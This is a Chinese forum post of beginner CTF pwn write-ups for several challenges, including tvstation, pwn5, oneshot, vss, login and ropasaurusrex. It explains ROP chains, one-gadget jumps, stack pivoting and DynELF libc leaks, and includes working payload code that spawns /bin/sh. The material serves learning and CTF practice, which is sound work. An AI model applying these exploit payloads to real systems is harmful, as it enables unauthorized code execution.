> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268713.htm)

> [原创] 新人 PWN 入坑总结 (二)

接上文，但是我发现给的链接这位 I 春秋作者好像删除了，不知道因为什么。这里我说明一下，这个新人总结帖发的内容基本都是看那个给的链接教程之后，自己写的，有些 exp，payload 什么的可能复制了一点点，但基本都自己改过的。如果那位 I 春秋的作者看到了要求我删除一些他的东西，请直接私信。

ROP 技术 0x03
===========

四、Security Fest CTF 2016-tvstation
----------------------------------

1. 题目给了 libc 库，需要查看一下版本，直接拖到 Linux 中运行一下./libc.so.6_x64，就可以知道是 libc2.24 的，但 Linux 中的 libc 没有该版本，所以用 pwndocker 来连接运行。具体怎么用看下方链接，同样 docker 也自行学习。

[https://github.com/skysider/pwndocker](https://github.com/skysider/pwndocker)

如果需要使用到这个 libc 调试，则在 python 中设置下列代码：

```
#注释头
 
io = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={"LD_PRELOAD":"./libc.so.6_x64"})

```

2. 然后开始分析文件，常规 checksec，开了 NX，IDA 打开文件找漏洞，发现输入 4 进入 debug 函数后可以泄露 system 的内存地址：

```
#注释头
 
v0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "system");
sprintf(fmsg, info, v0);
v1 = strlen(fmsg);
write(1, fmsg, v1);

```

dlsym() 的函数原型是

```
#注释头
 
void* dlsym(void* handle,const char* symbol);

```

该函数在 <dlfcn.h> 文件中, handle 是由 dlopen 打开动态链接库后返回的指针，symbol 就是要求获取的函数的名称，函数返回值是 void*, 指向函数的地址，供调用使用。write 函数的 fd 是 1，所以就相当于直接打印在屏幕上，这里涉及 linux 系统调用号内容，可以直接查 linux 下的目录 / usr/include/asm / 中的 unistd_32.h 和 unistd_64.h。

这段代码的意思就是把指向 system 函数的指针返回给 v0, 然后将 v0 格式化输出给 fmsg，之后将 fmsg 原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个 debug_func()，这里存在栈溢出：

```
#注释头
 
__int64 buf; // [rsp+0h] [rbp-20h]
return read(0, &buf, 0xC8uLL);

```

3. 现在有了 system 的内存地址和栈溢出，就差 / bin/sh 字符串了。这里用 IDA 打开题目给的 libc 文件，可以找到 bin/sh 字符串的地址 binsh_libc_addr 和 system 的地址 system_libc_addr。所以这就相当于有 system 的被 libc 加载的真实地址，那么 system 的真实 system_addr 减去 system_libc_addr 就可以得到 Libc 被加载进来的首地址 libc_start_addr。即现掌握地址：libc_start_addr，system_addr，system_libc_addr，binsh_libc_addr 通过计算可得：binsh_addr = system_addr - system_libc_addr + binsh_libc_addr。这不是栈溢出有了，system 函数和 binsh 字符串的真实地址有了，这不直接 getshell 就完事了吗，闹啥呢，这破题目，没点技术含量。

4. 但程序还是得走走，64 位程序，所以需要使用 ROPgadget 表来查找 pop rdi ; ret 这个代码所在的地址，也是在 Libc 中查找到，然后加上 libc_start_addr 就可得到 pop_rdi_addr。

5. 之后计算偏移量，远程调试下进行，payload 依次为 padding + pop_rdi_addr + binsh_addr + system_addr。

6. 再考虑输入情况：先在 Linux 下运行，所以能看到需要在接收到”: ” 时可以输入 4，然后进入到打印 system_addr，打印完之后，需要从打印出来的 system 地址读取进我们设定的 system_addr。

7. 由于打印格式是 @x0x7ffffff，所以在 recvuntil”@x”，之后开始获取打印的 system_addr:system_addr = int(io.recv(12), 16)，以十六进制总共读取 12 位

8. 读取完成 system_addr 后就可以开始输入 payload，之后就可以 interactive()。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

五、Tamu CTF 2018-pwn5
--------------------

1. 常规 checksec，开了 NX，打开 IDA 后分析找漏洞，可以看到 main 函数中 begning 函数中的，大多都是打印一些东西，然后由于输入到的是全局变量里，所以这些输入都没办法用来栈溢出。

2. 接着往下深入，这里可以看到 begning 函数中有：

```
#注释头
 
char v1; // [esp+Fh] [ebp-9h]
v1 = getchar()

```

但是 getchar() 不能作为溢出，因为不管缓冲区多大，都只会从缓冲区读取一个字符。再深入进到 first_day_corps() 函数，然后可以看到函数 change_major()，进入之后发现这里存在栈溢出：

```
#注释头
 
char dest; // [esp+Ch] [ebp-1Ch]
gets(&dest);

```

3. 由于 NX 保护，考虑用 ROP，然后找找 system 和”bin/sh”，这里没有 system，但是有 int80，可以通过：

ROPGadget --binary pwn5 | grep "int 0x80"

这段代码来查找，int80 同样可以用来开 shell。但是 int80 开 shell 需要设置寄存器的值，所以需要用到 gadget 来查找对应的代码段：

ROPgadget --binary pwn5 | grep "pop eax ; pop ebx ; pop esi ; pop edi ; ret"

(另外，如果是 64 位程序则又会不一样了，需要具体查找一下资料。关于 int80 相关的系统调用，有个网址查询：[https://syscalls.kernelgrok.com/](https://syscalls.kernelgrok.com/) 这玩意需要挂 VPN)

查到 32 位程序 syscall 调用 int80 所需要的条件：设置 eax = 11 = 0xb, ebx = &(“/bin/sh”), ecx = edx = edi = 0. “/bin/sh”

▲这里怎么找都可以，只要最后条件满足即可。参考 pwn_myself - else.py。代码执行过程中 return 直接就是返回跳转到当前 esp 的指向的内容。所以设置 payload 顺序也很重要。

原作者的代码是：

```
#注释头
 
ppppr = 0x080a150a    #pop eax; pop ebx; pop esi; pop edi; ret
pppr = 0x080733b0 #pop edx; pop ecx; pop ebx; ret
int_80 = 0x08071005   #int 0x80
binsh = 0x080f1a20    #first_name address
 
payload = "A"*32      #padding
payload += p32(ppppr) #pop eax; pop ebx; pop esi; pop edi; ret
payload += p32(0xb)   #eax = 0xb
payload += p32(binsh) #ebx = &("/bin/sh")
payload += p32(0)     #esi = 0
payload += p32(0)
payload += p32(0)     #edi = 0
payload += p32(pppr)  #pop edx; pop ecx; pop ebx; ret
payload += p32(0)     #edx = 0
payload += p32(0)     #ecx = 0
payload += p32(binsh) #ebx = &("/bin/sh")
payload += p32(int_80) #int 0x80

```

这里怎么 ROP 都可以，例如下列代码一样的效果：

```
#注释头
 
p_eax = 0x080BC396
p_esi = 0x080551B2
p_edi = 0x08052FFA
p_edx = 0x0807338A
p_ecx = 0x080E4325
p_ebx = 0x080538EB
int_80 = 0x08071005
binsh = 0x080f1a20 #first_name address
 
payload = 'A'*32 #padding
 
##set the value of register
payload += p32(p_eax)
payload += p32(0xb) #eax = 0xb
payload += p32(p_esi)
payload += p32(0) #esi = 0
payload += p32(p_edi)
payload += p32(0) #edi = 0
payload += p32(p_edx)
payload += p32(0) #edx = 0
payload += p32(p_ecx)
payload += p32(0) #ecx = 0
payload += p32(p_ebx)
payload += p32(binsh) #ebx = &("/bin/sh")
payload += p32(int_80) #int 0x80

```

4. 考虑到程序中没有 / bin/sh，而我们又会输入到全局变量中一些东西，所以可以将全局变量当作 / bin/sh 的地址，在输入过程中将 / bin/sh 输入到该全局变量中，可以通过 IDA 查出具体地址，因为全局变量的地址是不会改变的，方便之后调用。

▲挑选 gadget 时，注意不要选择有 0a 字样的，因为当我们往程序中输入时，回车即”\n” 所对应的就是 0a，如果有 0a，则我们的输入不会完全输入进去，只会停在 0a 处，后面的就没办法再输入进去了。

▲由于 int80 的性质，远程调试时会直接错误，需要在 IDA 中反复进行错误丢弃才能进行 shell 操作，但是 process 本地运行却会自动忽略。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

六、TJCTF 2016-oneshot
--------------------

1. 常规 checksec，只开了 NX，然后 IDA 打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方

```
#注释头
 
__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]
---------------------------------------------------------------------------
__isoc99_scanf("%ld", &v4);
-------------------------------------------------------------------------
return v4("Good luck!");

```

查看反汇编代码后发现会有这么一串代码，v4 是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现 call puts 函数之后的代码形式是这样的。

```
#注释头
 
var_8 = qword ptr -8
--------------------------------------------------------
mov  rax, [rbp+var_8]
mov  rdx, rax
mov  eax, 0
call rdx

```

也就是把我们输入的保存在 var_8 里的内容，给了 rax,rax 又给了 rdx，之后 call rdx。也就是我们输入的东西最后会被当初代码指令来执行。

2. 程序不存在栈溢出，输入只能是 4 个字节，已经规定好了。%ld 代表 long int，四个字节，程序又没有一次 getshell 的后门函数，所以就只能靠这 4 个字节来 getshell。

3. 这里考虑使用 one gadget RCE 来一步 getshell，首先在 Linux 下查找一下题目给的 libc 中有没有 onegadget:

![](https://bbs.pediy.com/upload/attach/202108/904686_9Q8GNFFHNK5G8N7.jpg)

4. 这样就可以通过一次跳转来 getshell，但是第一条有限制条件，由于汇编代码中在 call rdx 之前有 mov eax,0; 即 rax 就等于 0。(eax 在 64 位程序下就是 rax 的低 32 位) 或者先调试看看能不能满足条件，经过调试发现执行到 call rdx 时 rax = 0，也满足要求，那么就尝试写 payload。

5. 本地中首先需要连接到指定的库文件中，可以先在 linux 中 ldd libc 库文件来看题目给的库文件是什么版本，之后修改这段代码让 process 能够连接到指定版本的 libc 文件。(利用 pwndocker，或者自己下个对应版本的 ubuntu—docker，然后安装 python 之类的)

io = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={"LD_PRELOAD":"./libc.so.6_x64"})

6. 由于不知道 onegadget 被 libc 加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个 isoc99_scanf，第一个可以用来输入某个函数. got 表中 onegadget 的地址，然后程序会打印出来该函数真实地址，对应代码为：

```
#注释头
 
__isoc99_scanf("%ld", &v4);
printf("Value: 0x%016lx\n", *(_QWORD *)v4);

```

但注意输入的格式。由于输入格式为__isoc99_scanf("%ld", &v4) 中的 ld，也就是十进制有符号长整型，(l=long 型，d=Decimal 也就是十进制) 所以我们需要将该地址转化为十进制数然后输入，因为 scanf 格式规定了，之后打印的格式是 %016lx，其中 x 代表 Hexadecimal，也就是 16 进制，16 代表总共输出 16 位，0 代表不足 16 位则高位补零。(如果不知道可以拿 visualstudio 测试一下就可以)

7. 所以第一次输入应该为某个函数地址对应的十进制，这里选取 setbuf 函数，因为 setbuf 函数刚好在. got.plt 表中，同时也从外部引用，在 extern 也有，十六进制地址为：0x600ae0(这里选用 puts,printf, 甚至__libc_start_main 也行，只要满足在. got.plt 表中和 extern 表中) 也就是 6294240，即 io.sendline(“6294240”)。这样就可以打印出 setbuf 函数被加载进内存的地址，之后获取这个地址，先接收 io.recvuntil("Value:")，使得接下来打印的是 setbuf 的内存地址，之后使用

setbuf_memory_addr = int(io.recv()[:18], 16)

表示总共接收 18 个字符，之后以 16 进制形式转化位 int，10 进制形式。这里总共应该会打印 18 个字符，16+0x，也就是 18 个。

8. 之后计算偏移量，得到 one_gadget_rce 在内存中的地址即可：注意要转化为 str 字串形式发送

io.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))

9. 最后 io.interactive() 即可 getshell。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

Stack hijack0x04
================

一、Alictf 2016-vss
-----------------

1. 常规 checksec, 开了 NX 保护，IDA 打开找漏洞，发现程序特别奇怪，没有 main 函数，这里应该是把 elf 文件的符号信息给清除了。正常情况下编译出来的文件里面带有符号信息和调试信息，这些信息在调试的时候非常有用，但是当文件发布时，这些符号信息用处不大，并且会增大文件大小，这时可以清除掉可执行文件的符号信息和调试信息，文件尺寸可以大大减小。可以使用 strip 命令实现清除符号信息的目的。

2. 虽然这里找不到 main 函数，但是 start 函数是一定会存在的，由于 start 按 F5 反汇编不成功，所以这里进入到 start 函数的汇编代码中：

由于 start 中的结构基本固定，最后基本上都是如下，所以这里 sub_4011B1 其实就是 main 函数，这里就可以点进去看了。

```
#注释头
 
mov     rdi, offset main
call    _libc_start_main

```

2. 这里的 main 函数可以反汇编成功，那么就开始分析漏洞。第一个函数是 sub_4374E0，进去之后如下

```
#注释头
 
signed __int64 result; // rax
result = 37LL;
__asm { syscall; LINUX - sys_alarm }

```

使用系统调用号 37，也就是 0x25，代表 alarm。

3.sub_408800 字符串单参数，且参数都被打印到屏幕上，可以猜测是 puts。sub_437EA0 调用 sub_437EBD，并且 fd 参数位为 0 号，且接收三个参数，看下汇编代码：

```
#注释头
 
mov       eax, 0
syscall;  LINUX - sys_read

```

调用 0 号 syscall，推测为 read 函数。(系统调用号有)

4. 进入 sub_40108E 函数中分析，这个函数处理了我们的输入，可以说就是关键函数了。看半天啥也没看懂，直接上调试。先输入十几个 A 看看，发现经过 sub_400330 函数之后，内存中输入的 A，也就是 a1 处的内容被复制到了 v2，这里先猜测是个类似 strncpy 函数的东西。然后看内容，既然局部变量 v2 只有 0x40, 而这个复制函数的的参数有 80, 也就是 0x50，多了 0x10。那么再调试看看，输入 0x48 个字节 A，发现 sub_40108E 函数的 ebp 被我们改掉了：

sub_400330((__int64)&v2, a1, 80LL);

![](https://bbs.pediy.com/upload/attach/202108/904686_MTN9JJAB4RYZZ3B.jpg)

但是程序接着运行下去却不太行，陷入了循环，然后一直运行后崩溃，连之后的 read(v8, (__int64)&v3, 40LL); 这段 read 代码都没有运行。

5. 再观察下程序，有个代码有意思：

```
#注释头
 
sub_400330((__int64)&v2, a1, 0x50LL);
if ( (_BYTE)v2 == 'p' && BYTE1(v2) == 'y' )
    return 1LL;

```

在复制完字符串之后进入一个判断语句，如果开头是 py，就直接 retn，不经过下面代码，所以我们完全可以在这就直接返回。但是这里有个问题，这个 return 有没有汇编指令里的 leave 操作呢，如果没有，那 rsp 仍然在最前面，不会跳转到返回地址的地方，看汇编代码，可以看到最后是通过判断后跳转到了 locret_40011AF，而这段地址里就是 leave 和 retn 的汇编操作，能够将 rsp 拉到返回地址处，那直接 return 就完事了。![](https://bbs.pediy.com/upload/attach/202108/904686_MWD3GM9EEA9B96D.jpg)

6. 那么这里就可以判断出来我们的输入会被复制到 v2 这个局部变量中，并且最多 0x50，也就是说除开 rbp，我们可以再控制一个该函数的返回地址。那么开始尝试呗。由于只有一个返回地址，没有后门程序，最先想到的肯定是 onegadget，但是不知道 libc 版本，没办法 onegadget。那只有一个返回地址可以做什么，那么只有栈劫持了。其它 WP 大多都是抬高 rsp，我想可不可以降低 rsp，通过一次 payload 来 getshell，也就是通过 ROPgadget 搜索 sub rsp，但是搜出来的都不太行，要么太大，超过 0x50，要么就很奇怪。然后一般栈劫持需要一个 ret 来接着控制程序流，这里也没搜到。同时由于使用的复制函数经过调试就是 strncpy，字符串里不能有 \ x00，否则会被当做字符串截断从而无法复制满 0x50 字节制造可控溢出，这就意味着任何地址 (因为地址基本都会在最开始带上 00) 都不能被写在前 0x48 个字节中，彻底断了 sub rsp 的念想。所以还是抬高栈吧。但是抬高栈也有点问题，就是我们输入的被复制的只有 0x50 个字节，抬高有啥用，不可控啊。然后就想到之前的 read 函数，读了 400 个字节，而紧接着就是调用该函数。刚好局部变量 v2 第一个被压栈，与 sub_40108E 函数栈的栈底紧紧挨在一起，也就是说越过 sub_40108E 函数栈的栈底和返回地址就可以直接来到 main 函数栈。而 main 函数栈中又只有一个我们输入的局部变量 v4，所以 sub_40108E 函数栈的返回地址之后的第一个地址就是我们输入的局部变量 v4 的地址。(这里通过调试也可以发现)

7. 那么经过计算，其实只要有一个 pop,ret 操作，让 rsp 抬高一下就可以到达我们输入的首地址。但是由于经过前面分析，我们需要在程序开头输入 py 来使得该函数直接 return，那么如果只是一个 pop,ret 操作，那么程序第一个执行的代码就是我们输入的开头，包含了 py 的开头，这就完全不可控了，开头如果是 py 那怎么计算才能是一个有效地址呢。

8. 那么就只能查找 add rsp，只要满足 add rsp 0x50 之上就可以完全操控了。这里至少需要 0x50 也是因为这是 strncpy，不能将地址写到前 0x48 个字节，否则会截断，而最后返回地址的覆盖可以被完全复制是这里本来就是一个返回地址，保存的内容应该是 00401216，也就是之前 call sub_40108E 的下一段地址。这里在复制的时候肯定被截断了，但是由于本来就是找到一个可用的地址，截断了覆盖的也只是将 401216 换成了 add rsp 0x58;ret 这个地址 (如果我们的 add rsp 的有效地址地方包含了 00，那指定会出错)。那么 payload 的语句应该是 payload = "py" + "a"*(0x48-0x02) + add_rsp_addr + padding + 实际控制代码。

9. 利用 ROPgadget 搜索 add esp 的相关内容，可以查到一个地址 0x46f205，操作是 add rsp, 0x58; ret，这样就可以顺利将栈抬升到 0x58 的地方，所以 payload 的组成应该是：payload = “py” + “a”*0x46 + p64(0x46f205) + “a”*8 + p64(addr2)+...(a*8 是用来填充的，因为抬升到了 0x58 处，复制之后 0x50 处是一段空白地方，所以还需要填充一下使 p64(addr2) 能顺利被抬升至 0x58 处被执行)。后面的 p64(addr2) 和... 就是我们的常规 gadget 操作了。

10. 现在需要 system 函数和 / bin/sh 字符串了。没有 Libc，system 函数和 / bin/sh 也没有，所以这里需要输入 / bin/sh 字符串，然后 system 函数需要通过 syscall 来实现。(64 位程序下是 syscall 函数，32 位程序下就是 Int 0x80)

11. 这里先完成 binsh 的输入：

```
#注释头
 
payload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)

```

因为是 64 位程序，函数从左往右读取参数所取寄存器依次为：rdi，rsi，rdx, rcx, r8, r9, 栈传递，但是实际情况中是从右往左读取参数，也就是当只有三个参数时，读取顺序应该是 rdx,rsi,rdi 对应的为 read(rdi,rsi,rdx)。

这里 rdx 是输入的大小，rsi 是输入的内存地址 buf(随便找一段可读可写的就行了)，rdi 是 fd 标志位，由于是通过 syscall 调用，所以除了配置三个 read 函数参数还需要配置系统调用号，也就是 rax 的传参为 0x0。![](https://bbs.pediy.com/upload/attach/202108/904686_4X4YG9Y6XJ8YU3N.jpg)这里如果不使用 syscall，其实也可以用我们之前猜出来的 read 函数的 plt 表，只是这样就可以不用设置 rax 了。

▲这里不能使用 401202 处的 call read，因为 call 会压入下一行代码的作为 read 返回地址，那样就不可控了。这里选择系统调用是因为没有 read 在 got 表中的真实地址，不然其实调用 got 表地址也可以。

12. 接着调用 system 函数，同样采用 syscall 系统调用，需要几个参数的设置 rax=59,rdx=0,rsi=0,（这是调用 syscall 必须的前置条件，因为是 linux 规定的，可以上网查一下就知道）。都可以通过 Pop gadget 来实现，之后传参 rdi 为 & buf，最后调用即可 getshell。(59 为系统调用号) 所以紧接着的 payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)![](https://bbs.pediy.com/upload/attach/202108/904686_VJ5RWZ3X52EGJDT.jpg) 这里就必须的设置 rax 为 0x3b 了。

▲sh 不能用来传给 syscall 开 shell，但是 int 0x80 可以。syscall-64，int 0x80-32。

▲syscall 是在上进入内核模式的默认方法 x86-64。该指令在 Intel 处理器的 32 位操作模式下不可用。sysenter 是最常用于以 32 位操作模式调用系统调用的指令。它类似于 syscall，但是使用起来有点困难，但这是内核的关注点。int 0x80 是调用系统调用的传统方式，应避免使用，是 32 位程序下的。

系统调用查询网址：[https://syscalls.w3challs.com/](https://syscalls.w3challs.com/)

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、pwnable.kr-login
------------------

1. 常规 checksec 一下，开了 canary 和 NX，然后 IDA 打开分析漏洞。发现 auth 函数中可能存在栈溢出：

```
#注释头
 
int v4; // [esp+20h] [ebp-8h]
------------------------------------
memcpy(&v4, &input, a1);

```

如果 a1 大于 8h，而我们可以控制 input，那么就可以造成栈溢出。再往上翻一下，发现就是将我们的输入通过一系列操作给到 input，然后 a1 是 input 的长度。

实际情况是将我们的输入给 s，进行 Base64 解码，然后给 v4，长度给 v6。v4 又给 input，v6 传值到达 auth 函数赋值给 a1。这里 input 是全局变量，所以 auth 函数中的 input 中的内容其实就是我们输入经过 base64 解码的内容。

```
#注释头
 
_isoc99_scanf("%30s", &s);
--------------------------------------------------
v6 = Base64Decode((int)&s, &v4);
--------------------------------------------------
memcpy(&input, v4, v6);
------------------------------------------------------
auth(v6) == 1

```

▲题外话：最开始 Base64 搞不懂哪个是输入，哪个是输出，直接经过调试就可以判断。况且最开始的 v4 是 0，总不能程序永远都将 0 进行 base64 解码然给到我们的输入地址中吧。但是调试的时候发现，每次输入相同的值，但是解码后得到的 v4 的值却是不一样的。这就纳闷了，为什么一样的输入四个 AAAA 得到的解码值不一样呢，难道程序还有个随机变量不成。之后再仔细调试发现这个 base64decode 有点不一样，虽然传入的两个参数都是地址，但是第一个参数的操作却是从该地址直接取值进行解码，然后对于第二个参数的操作却并不是将解码结果给到第二个参数，而是再开辟一块堆内存，之后将该堆内存的地址给到第二个参数。所以每次解码后第二个参数，也就是栈上的一个值，总是不一样，因为这里保存的是一个随机生成的堆地址，而不是解码后的值。同样之后观察 main 函数中的 memcpy 也可以发现：memcpy(&input, v4, v6); 而 memcpy 的原型是：

```
#注释头
 
void *memcpy(void *dest, const void *src, size_t n)

```

前两个参数类型都应该是地址才对，而这里却直接将 v4 的值给传进去，那不就说明 v4 的值是一个地址吗。然后再跳转到汇编代码分析一波:

```
#注释头
 
.text:080493B3   call _memset
.text:080493B8   mov dword ptr [esp+18h], 0
.text:080493C0   lea eax, [esp+18h]
.text:080493C4   mov [esp+4], eax
.text:080493C8   lea eax, [esp+1Eh]
.text:080493CC   mov [esp], eax
.text:080493CF   call Base64Decode

```

同样 Base64Decode 函数的两个参数也都是地址，这里是直接取栈地址给到 eax，然后再将 eax 的值给相应 esp 指向的栈内存。所以可以看到 Base64Decode 取值应该是从栈上取两个地址才对，分别位于 main 函数栈的是 esp+4 和 esp。所以如果这里有个格式化字符串那么就完全可以泄露处出栈地址，之后就完全可控，可惜没有。还是回到正轨分析吧。

2. 所以经过前面分析，程序要求我们输入一个 base64 编码过的字符串，随后会进行解码并且复制到位于 bss 段的全局变量 input 中，最后使用 auth 函数进行验证，通过后进入带有后门的 correct() 打开 shell。并且由于长度有限制：所以我们的输入 base64 解码后最多只能有 12 个字节。

```
#注释头
 
if ( v6 > 12 )
{
    puts("Wrong Length");
}

```

3. 汇总一下，程序存在栈溢出，但只能溢出 4 个字节，也就是一个地址，也就是最多只能覆盖到 ebp，然后存在后门函数。由于没办法直接覆盖返回地址，所以这里就在 ebp 上做文章，使用栈劫持技术。之前的栈劫持可以用 rop，但是这里没办法，因为无法进行返回地址覆盖。但是还有一个地方，就是我们的输入最后会被解码赋值给 input，这个 input 是个全局变量，不受到 ASLR 影响，而又可以控制 12 个字节，如果可以把栈挪移到这个地方，那么就是可控了。

栈模型如下：

![](https://bbs.pediy.com/upload/attach/202108/904686_AJFPAZQ2Z7WUHYD.jpg)![](https://bbs.pediy.com/upload/attach/202108/904686_9HEB96B6F2WKGD4.jpg)

可控栈如下：

![](https://bbs.pediy.com/upload/attach/202108/904686_HAP7ZYA67BMX52R.jpg)

4. 总体思路应该是：

①劫持 auth 函数的栈底到 input_addr，那么 auth 函数在退出到 main 函数时，main 函数栈的栈底就不会回到之前的 main 函数栈栈底，而是会挪移到我们 input_addr，也就是 payload3 的值。

②开始执行 auth 函数中的退出操作，到 leave 时，执行操作 leave 的第一步汇编操作 mov esp ebp，将栈顶指向 ebp 指向的内容，此时 ebp 已经被修改成了 payload3，而 payload3 会被赋值成 Input_addr，也就是 esp 会指向 input_addr。

②执行 leave 第二步汇编指令 pop ebp，将当前栈顶的值赋值给 ebp，也就是 ebp 的值会变成 payload1，(这里的 payload1 没什么作用，可以随便填) 之后 esp 由于 pop，esp+0x4，会往栈底移动一个地址，移动到指向我们输入的 payload2 处。

![](https://bbs.pediy.com/upload/attach/202108/904686_FK8YRSVDGJPMTXN.jpg)

④之后 retn 执行，实际指令为 pop eip，也就是将当前栈顶数据给 eip，也就是 eip 被赋值为我们 payload 中的 payload2。

![](https://bbs.pediy.com/upload/attach/202108/904686_TJ2SESACNJWCSPH.jpg)

⑤最后执行 retn 的第二条实际指令：jmp eip，此时 eip 就已经是 payload2 的值，所以将该 payload2 设置为 correct 函数地址或者是 system("/bin/sh"); 就可以 getshell。

总的来说，就是利用 leave 和 retn 两个操作来劫持 eip 的值，使其直接指向后门函数，一步 getshell。

5. 创建 payload，组成应该是：

```
#注释头
 
#首先确定地址：
correct_addr = 0x08049278
input_addr = 0x0811eb40

```

之后确定 payload 的组成：

payload = padding + eip + input_addr。

```
#注释头
 
payload = "aaaa"              #padding
payload += p32(0x08049284)       
#system("/bin/sh")地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里
payload += p32(0x0811eb40)        #新的eip地址

```

最后得注意发送的是 base64 编码之后的 payload。

参考资料:

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

用 DynELF 获取 libc0x05
====================

▲题外话：其实久了之后，我还是比较喜欢用 LibcSearcher，更好用，但是如果找不到的对应版本的话，可以试试这个。

一、LCTF 2016-pwn100_without_libc  

----------------------------------

1. 与之前做的 pwn100 一模一样，只是之前有给 Libc，这次没给 Libc。栈溢出，选择用 Puts 函数来泄露地址从而再执行栈溢出来重复使用。

2. 编写 leak 函数，由于用 Puts 函数打印，所以需要有个循环条件，具体原因可以查看之前写的。

```
#注释头
 
def leak(addr):
    count = 0
    up = ''
    content = ''
    payload = 'A'*72 #padding
    payload += p64(pop_rdi)           #给puts()赋值
    payload += p64(addr)              #leak函数的参数addr
    payload += p64(puts_addr)         #调用puts()函数
    payload += p64(start_addr)        #跳转到start，恢复栈
    payload = payload.ljust(200, 'B') #padding
    io.send(payload)
    io.recvuntil("bye~\n")
    while True:                             #无限循环读取，防止recv()读取输出不全
        c = io.recv(numb=1, timeout=0.1)    #每次读取一个字节，设置超时时间确保没有遗漏
        count += 1
        if up == '\n' and c == "":          #上一个字符是回车且读不到其他字符，说明读完了
            data = data[:-1]+'\x00'         #最后一个字符置为\x00
            break
        else:
            data += c         #拼接输出
            up = c            #保存最后一个字符
    data = data[:4]           #截取输出的一段作为返回值，提供给DynELF处理
log.info("%#x => %s" % (addr, (data or '').encode('hex')))
return data

```

3. 得到 system_addr 的地址后，后续的操作用万能 gadget 和 read 函数即可实现。如果还需要其它地址，也可以通过此方法来打印，也是一样的。

(参照之前不给 Libc 的 pwn100)

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、PlaidCTF 2013 ropasaurusrex
-----------------------------

1. 常规 checksec，只开启了一个 NX，不能使用 shellcode，IDA 分析漏洞，程序的 sub_80483F4() 函数栈溢出：

```
#注释头
 
char buf; // [esp+10h] [ebp-88h]
------------------------------------------------------
return read(0, &buf, 0x100u);

```

有 write 函数，没有 libc，got 表里没有 system，也没有 int 80h/syscall，没有 binsh 字符串。

2. 这种情况下我们就可以使用 DynELF 来 leaklibc，进而获取 system 函数在内存中的地址，然后就可以再用 read 函数来读取字符串。

3. 首先编写 leak 函数，也就是需要调用 write 函数打印需要泄露的地址

常规的 leak 函数模式：

```
#注释头
 
def leak(addr):
    payload = ''
    payload += 'A'*n #padding
    payload += p32(write_addr) #调用write
    payload += p32(start_addr) #write返回到start
    payload += p32(1) #write第一个参数fd
    payload += p32(addr) #write第二个参数buf
    payload += p32(8) #write第三个参数size
    io.sendline(payload)
    content = io.recv()[:8] #接受内容读取通过write打印的地址
    print("%#x -> %s" %(addr, (content or '').encode('hex')))
    #这里打印不需要也可以，只是可以打印出来让我们看到write打印了什么地址，基本都打印了
    return content
    #这里return的conten有很多地址，需要通过之后的DynELF来lookup对应的地址

```

这里的 write 函数可以换成 put 或者 printf 函数，但是如果改变了，那么后面的参数个数也需要发生改变，对应打印函数的形式：

```
#注释头
 
ssize_t write(int fd,const void *buf,size_t count);
int puts(const char *s)
int printf(const char*format, ......)；

```

具体请参考：

[https://www.anquanke.com/post/id/85129](https://www.anquanke.com/post/id/85129)

4. 接下来就需要创建 DynELF 类来使用

```
#注释头
 
d = DynELF(leak, elf = elf)
#创建DynELF类，传入需要泄露的地址，从elf文件中获取
system_addr = d.lookup('system', 'libc')

```

5. 找到 system_addr 之后，就可以通过再次利用栈溢出来读取字符串，因为之前 write 的返回地址已经是最开始的 start 地址。再次运行到 read 函数读取第二次的 payload，组成为：

```
#注释
 
payload = padding
payload += read_addr       #覆盖eip，将sub_80483F4函数的返回地址劫持到read函数)
payload += system_addr     #使得read函数的返回地址为system)
payload += p32(fd)         #read函数的第一个参数，同时也对应system函数的返回地址
payload += p32(binsh_addr) #read函数读取进binsh的地址，同时也对应system函数的参数
payload += p32(size)       
#read函数的第三个参数，读取的字符串大小，于system函数无实际意义，但是如果system函数返回了，那么这就是返回之后的eip，下一条执行的代码地址。

```

6. 程序总流程如下：

由于第一段 Payload 最后 write 调用后返回到了 start，所以又调用 sub_80483F4 函数，进入读取界面，需要输入第二段 payload 栈溢出，劫持 sub_80483F4 函数的返回地址 eip 为 read 函数地址，从而进入 read 函数。之后再次劫持 read 函数的返回地址为 system 函数，并且将 read 的第二个参数，也就是读取进的 binsh 字符串也传入 system 函数，从而 getshell。

▲call _read 函数和直接调用 read_plt 的区别：

1.call _read 函数会 push eip，会使得栈中结构从我们原本设置好的：

```
#注释头
 
padding
(call read_addr)_addr
system_addr
fd
binsh_addr
size

```

变成:

```
#注释头
 
padding
(call read_addr)_addr
(call read_addr)_addr下一条指令
system_addr
fd
binsh_addr
size

```

